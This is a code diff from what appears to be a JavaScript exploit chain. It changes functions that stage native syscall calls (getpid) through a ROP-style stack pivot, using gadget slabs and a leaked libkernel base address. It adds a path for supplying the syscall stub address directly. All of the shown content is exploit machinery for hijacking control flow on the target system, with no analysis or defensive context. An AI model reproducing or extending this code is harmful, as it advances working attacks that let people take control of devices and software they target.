@@ -352,17 +352,27 @@ export function layoutGetpidSlab(M, G, stub) {
     layoutNativeCall(M, G, stub, []);
 }
 
-export function stageGetpid(p, prep, libkernelBase, off, stubOffOverride) {
+export function stageGetpid(p, prep, libkernelBase, off, stubOffOverride, opts) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("stageGetpid: no prep");
-    let stubOff = stubOffOverride;
-    if (stubOff == null && off.k_stubs && off.k_stubs[SYS.getpid] != null)
-        stubOff = off.k_stubs[SYS.getpid];
-    if (stubOff == null)
-        stubOff = off.k_getpid_syscall != null ? off.k_getpid_syscall : 0x4fa;
-    prep._layout = layoutNativeCall(prep.M, prep.G, libkernelBase.add32(stubOff), []);
+    opts = opts || {};
+    let target;
+    if (opts.stubAddr) {
+        target = opts.stubAddr;
+        prep.stubOff = opts.stubOff != null ? opts.stubOff : null;
+    } else {
+        let stubOff = stubOffOverride;
+        if (stubOff == null && off.k_stubs && off.k_stubs[SYS.getpid] != null)
+            stubOff = off.k_stubs[SYS.getpid];
+        if (stubOff == null)
+            stubOff = off.k_getpid_syscall != null ? off.k_getpid_syscall : 0x4fa;
+        target = libkernelBase.add32(stubOff);
+        prep.stubOff = stubOff;
+    }
+    prep._layout = layoutNativeCall(prep.M, prep.G, target, []);
+    prep.stubAddr = target;
     prep.staged = true;
-    prep.stubOff = stubOff;
+    prep.stagedKind = "getpid";
 }
 
 export function stageUsleep(p, prep, libkernelBase, off, usec) {
@@ -787,10 +797,12 @@ export function patchPrepG5(prep, g5Addr) {
     put(prep.M.pivotDv, 0x10, g5Addr);
 }
 
-export function layoutGetpidStack(prep, libkernelBase, stubOff) {
+export function layoutGetpidStack(prep, libkernelBase, stubOff, stubAddr) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("layoutGetpidStack: no prep");
-    prep._layout = layoutNativeCall(prep.M, prep.G, libkernelBase.add32(stubOff), []);
+    const target = stubAddr || libkernelBase.add32(stubOff);
+    prep._layout = layoutNativeCall(prep.M, prep.G, target, []);
+    prep.stubAddr = target;
     prep.staged = true;
     prep.stagedKind = "getpid";
     prep.stubOff = stubOff;
@@ -952,7 +964,8 @@ export function fireNativeCallBisect(p, prep, off) {
 export function firePivotGetpid(p, prep, libkernelBase, off, stubOffOverride, opts) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("firePivotGetpid: no prep");
-    stageGetpid(p, prep, libkernelBase, off, stubOffOverride);
+    opts = opts || {};
+    stageGetpid(p, prep, libkernelBase, off, stubOffOverride, opts);
     const content = verifySlabContent(p, prep);
     if (!content.ok)
         throw new Error("firePivotGetpid: slab content: " + content.reasons.join("; "));
